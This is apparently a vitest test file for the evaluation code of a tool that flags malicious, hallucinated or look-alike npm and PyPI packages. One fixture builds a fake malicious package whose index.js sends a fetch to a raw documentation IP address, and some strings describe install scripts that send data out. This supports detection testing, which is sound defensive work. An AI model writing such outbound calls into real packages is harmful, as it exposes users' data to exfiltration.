import { afterEach, describe, expect, it, vi } from "vitest";
import { checkPackages } from "../src/engine/check";
import type { CheckResult } from "../src/engine/score";
import { atReport, blockCause, counted, coverage, outcome, pick, rate, reasonKey, state, tally, uniqueBy } from "../scripts/eval-core";
import { daysAgo, fakeFetch, npmPackage, osv, pypiPackage, tarballUrl, tgz } from "./fakes";

const DAY_MS = 86_400_000;

afterEach(() => vi.restoreAllMocks());

// A verdict as the engine would give it, without going through the network.
function result(verdict: CheckResult["verdict"], reasons: string[], registry: Partial<CheckResult["checks"]["registry"]> = {}): CheckResult {
  return {
    name: "pkg",
    ecosystem: "npm",
    verdict,
    reasons,
    suggestions: [],
    checks: {
      registry: { status: "found", latestVersion: "1.0.0", firstSeenAt: null, maintainers: 2, installScripts: [], hasRepo: true, ...registry } as CheckResult["checks"]["registry"],
      osv: { status: "ok", advisories: [] },
      lookalike: [],
      code: { status: "skipped" },
    },
    checkedAt: new Date().toISOString(),
  };
}

describe("eval", () => {
  it("sampling is seeded, never repeats a name and takes everything when asked for more", () => {
    const names = Array.from({ length: 1000 }, (_, i) => `pkg-${i}`);
    const first = pick(names, 50, 17);
    expect(pick(names, 50, 17)).toEqual(first);
    expect(pick(names, 50, 18)).not.toEqual(first);
    expect(new Set(first).size).toBe(50);
    expect(first.every((name) => names.includes(name))).toBe(true);
    // Not just the first names of the list.
    expect(first.some((name) => names.indexOf(name) >= 50)).toBe(true);
    expect(new Set(pick(names.slice(0, 10), 50, 17))).toEqual(new Set(names.slice(0, 10)));
    expect(pick([], 5, 17)).toEqual([]);
    // Every order is equally likely (a naive shuffle favours some of the six by about a quarter).
    const orders = new Map<string, number>();
    for (let seed = 0; seed < 6000; seed++) {
      const order = pick(["a", "b", "c"], 3, seed).join("");
      orders.set(order, (orders.get(order) ?? 0) + 1);
    }
    expect(orders.size).toBe(6);
    for (const times of orders.values()) expect(times).toBeGreaterThan(900), expect(times).toBeLessThan(1100);
    expect(names).toEqual(Array.from({ length: 1000 }, (_, i) => `pkg-${i}`));
    expect(uniqueBy([{ name: "a", id: 1 }, { name: "b", id: 2 }, { name: "a", id: 3 }], (x) => x.name)).toEqual([
      { name: "a", id: 1 },
      { name: "b", id: 2 },
    ]);
  });

  it("reads which versions an advisory covers", () => {
    const pkg = { name: "evil", ecosystem: "npm" };
    expect(coverage({ affected: [{ package: pkg, ranges: [{ type: "SEMVER", events: [{ introduced: "0" }] }] }] })).toBe("all");
    // Open-ended from a later version still covers the latest.
    expect(coverage({ affected: [{ package: pkg, ranges: [{ type: "SEMVER", events: [{ introduced: "1.2.0" }] }] }] })).toBe("all");
    expect(coverage({ affected: [{ package: pkg, versions: ["0.23.3"] }] })).toEqual(["0.23.3"]);
    expect(
      coverage({
        affected: [{ package: pkg, ranges: [{ type: "SEMVER", events: [{ introduced: "0" }, { fixed: "2.0.0" }] }], versions: ["1.0.0", "1.1.0"] }],
      }),
    ).toEqual(["1.0.0", "1.1.0"]);
    expect(coverage({ affected: [{ package: pkg, ranges: [{ type: "SEMVER", events: [{ introduced: "0" }, { last_affected: "1.0.0" }] }] }] })).toEqual([]);
    expect(coverage({})).toEqual([]);
  });

  it("classifies each result once, and unverified is never safe", () => {
    expect(outcome(result("block", ["doesn't exist on npm (likely hallucinated)"]))).toBe("block");
    // A block stays a block even when one of its checks couldn't finish.
    expect(outcome(result("block", ['looks like popular package "react"', "unverified: download count unavailable (rate limited)"]))).toBe("block");
    expect(outcome(result("caution", ["first seen 2 days ago"]))).toBe("caution");
    expect(outcome(result("caution", ["first seen 2 days ago", "unverified: download count unavailable (rate limited)"]))).toBe("unverified");
    expect(outcome(result("caution", ["unverified: couldn't reach npm (timed out)"]))).toBe("unverified");
    expect(outcome(result("safe", []))).toBe("safe");
  });

  it("rates show the count and the share, also without unverified results", () => {
    const outcomes = ["block", "block", "block", "caution", "unverified", "safe"] as const;
    const t = tally(outcomes.map((o) => o));
    expect(t).toEqual({ n: 6, block: 3, caution: 1, unverified: 1, safe: 1 });
    expect(rate(t.block, t.n)).toBe("50.0% (3/6)");
    expect(rate(t.block, t.n - t.unverified)).toBe("60.0% (3/5)");
    expect(rate(1, 3)).toBe("33.3% (1/3)");
    expect(rate(0, 0)).toBe("n/a");
    expect(tally([])).toEqual({ n: 0, block: 0, caution: 0, unverified: 0, safe: 0 });
    // Caution reasons are grouped without their numbers, names or details.
    expect(reasonKey("first seen 3 days ago")).toBe("first seen N days ago");
    expect(reasonKey("only 1 downloads last week")).toBe("only N downloads last week");
    expect(reasonKey('name is close to popular package "react"')).toBe('name is close to popular package "…"');
    expect(reasonKey("runs install scripts (postinstall, install)")).toBe("runs install scripts");
    expect(reasonKey("unverified: download count unavailable (rate limited)")).toBe("unverified: download count unavailable");
  });

  it("tells removed, placeholder, clean-now and live packages apart", () => {
    const sample = { name: "pkg", versions: "all" as const };
    expect(state(sample, result("block", [], { status: "not_found" } as never))).toBe("removed");
    expect(state(sample, { ...result("caution", []), checks: { ...result("caution", []).checks, registry: { status: "error", reason: "timed out" } } })).toBe(
      "unreachable",
    );
    expect(state(sample, { ...result("block", []), checks: { ...result("block", []).checks, registry: { status: "skipped", reason: "x" } } })).toBe("invalid");
    expect(state(sample, result("block", [], { latestVersion: "0.0.1-security" }))).toBe("placeholder");
    expect(state(sample, result("safe", []))).toBe("live");
    expect(state({ name: "pkg", versions: ["0.9.0"] }, result("safe", []))).toBe("clean-now");
    expect(state({ name: "pkg", versions: ["1.0.0"] }, result("safe", []))).toBe("live");
    // Legit and invented samples have no advisory: a found package is live.
    expect(state({ name: "pkg" }, result("safe", []))).toBe("live");
    // A PyPI version ending in -security is just a version.
    expect(state(sample, { ...result("safe", [], { latestVersion: "1.0-security" }), ecosystem: "pypi" })).toBe("live");
  });

  it("leaves out what a set isn't about", () => {
    const gone = result("block", ["doesn't exist on npm (likely hallucinated)"], { status: "not_found" } as never);
    const malware = result("block", ["known malicious package (MAL-2026-1)"]);
    const copycat = result("block", ['looks like popular package "react"', "first seen 1 day ago"]);
    const clean = result("safe", []);
    // Malicious: only packages whose latest version is no longer affected.
    expect(counted("malicious", { name: "pkg", versions: ["0.9.0"] }, clean)).toBe(false);
    expect(counted("malicious", { name: "pkg", versions: "all" }, gone)).toBe(true);
    // Legitimate: names that no longer exist, and known malware hiding among them; other blocks are false blocks.
    for (const set of ["legit", "install-scripts"]) {
      expect(counted(set, { name: "pkg" }, gone)).toBe(false);
      expect(counted(set, { name: "pkg" }, malware)).toBe(false);
      expect(counted(set, { name: "pkg" }, copycat)).toBe(true);
      expect(counted(set, { name: "pkg" }, clean)).toBe(true);
    }
    // Invented: everything counts.
    expect(counted("invented", { name: "pkg" }, gone)).toBe(true);
    expect(counted("invented", { name: "pkg" }, clean)).toBe(true);
  });

  it("names what caused each block", () => {
    expect(blockCause(result("block", ["known malicious package (MAL-2025-1)"]))).toBe("malware database");
    expect(blockCause(result("block", ["taken down by npm for security reasons"]))).toBe("npm takedown");
    expect(blockCause(result("block", ["doesn't exist on PyPI (likely hallucinated)"]))).toBe("doesn't exist");
    expect(blockCause(result("block", ["install script runs shell commands and sends data to a raw IP address", 'looks like popular package "x"']))).toBe(
      "code check",
    );
    expect(blockCause(result("block", ['looks like popular package "react"', "first seen 1 day ago"]))).toBe("look-alike");
    // Other install-script reasons lead a look-alike block only after it, never on their own.
    expect(blockCause(result("block", ["install script added in the latest version"]))).toBe("other");
    expect(blockCause({ ...result("block", ["has invisible characters"]), checks: { ...result("block", []).checks, registry: { status: "skipped", reason: "x" } } })).toBe(
      "invalid name",
    );
  });

  it("scores a live malicious package as of its report date without the malware lookup", async () => {
    // First seen 400 days ago, reported 5 days after it appeared; its code sends data to a raw IP address.
    const routes = npmPackage("evil-pkg", {
      firstSeenDaysAgo: 400,
      archive: async () =>
        new Response(await tgz([{ path: "package/package.json", body: "{}" }, { path: "package/index.js", body: 'fetch("http://203.0.113.9/x")' }])),
    });
    fakeFetch({ ...routes, "https://api.osv.dev/v1/querybatch": osv({ "evil-pkg": ["MAL-2025-1"] }) });
    const [today] = await checkPackages("npm", ["evil-pkg"]);
    expect(today!.verdict).toBe("block");
    // Too old to be opened today.
    expect(today!.checks.code).toEqual({ status: "skipped" });

    const reported = Date.parse(daysAgo(395));
    const then = await atReport(today!, reported);
    expect(then.verdict).toBe("caution");
    expect(then.reasons).toEqual(["first seen 5 days ago", "package code sends data to a raw IP address"]);
    expect(then.checks.osv).toEqual({ status: "skipped" });
    expect(then.checkedAt).toBe(new Date(reported).toISOString());

    // A report long after the package appeared: nothing would have opened it, and nothing is downloaded.
    const spy = vi.mocked(globalThis.fetch);
    spy.mockClear();
    const late = await atReport(today!, reported + 200 * DAY_MS);
    expect(late.verdict).toBe("safe");
    expect(spy).not.toHaveBeenCalled();
  });

  it("reuses the code already read today, and never calls a failed check safe", async () => {
    const routes = npmPackage("young-pkg", { firstSeenDaysAgo: 3, weeklyDownloads: 5 });
    fakeFetch({ ...routes, "https://api.osv.dev/v1/querybatch": osv({ "young-pkg": ["MAL-2026-2"] }) });
    const [today] = await checkPackages("npm", ["young-pkg"]);
    expect(today!.checks.code.status).toBe("read");
    const spy = vi.mocked(globalThis.fetch);
    spy.mockClear();
    const then = await atReport(today!, Date.parse(daysAgo(1)));
    expect(spy).not.toHaveBeenCalled();
    expect(then.checks.code).toEqual(today!.checks.code);
    expect(then.reasons).toEqual(["first seen 2 days ago", "only 5 downloads last week"]);

    // The archive is gone by the time the eval reads it: unverified, never safe.
    vi.restoreAllMocks();
    const old = npmPackage("gone-code", { firstSeenDaysAgo: 400 });
    fakeFetch({ ...old, [tarballUrl("gone-code", "1.0.0")]: () => new Response(null, { status: 404 }) });
    const [established] = await checkPackages("npm", ["gone-code"]);
    const unread = await atReport(established!, Date.parse(daysAgo(399)));
    expect(unread.verdict).toBe("caution");
    expect(unread.reasons).toContain("unverified: code check unavailable (archive missing)");

    // The package disappeared between the check and the re-read.
    vi.restoreAllMocks();
    const vanishing = npmPackage("vanishing", { firstSeenDaysAgo: 400 });
    fakeFetch(vanishing);
    const [before] = await checkPackages("npm", ["vanishing"]);
    vi.restoreAllMocks();
    fakeFetch({ "https://registry.npmjs.org/vanishing": () => new Response(null, { status: 404 }) });
    expect((await atReport(before!, Date.parse(daysAgo(399)))).reasons).toContain("unverified: code check unavailable (registry unavailable)");
  });

  it("never opens a pypi package", async () => {
    fakeFetch(pypiPackage("young-py", { created: daysAgo(3), owners: 1 }));
    const [today] = await checkPackages("pypi", ["young-py"]);
    const spy = vi.mocked(globalThis.fetch);
    spy.mockClear();
    const then = await atReport(today!, Date.parse(daysAgo(1)));
    expect(spy).not.toHaveBeenCalled();
    expect(then.checks.code).toEqual({ status: "skipped" });
    expect(then.reasons).toEqual(["first seen 2 days ago", "only one maintainer"]);
  });
});
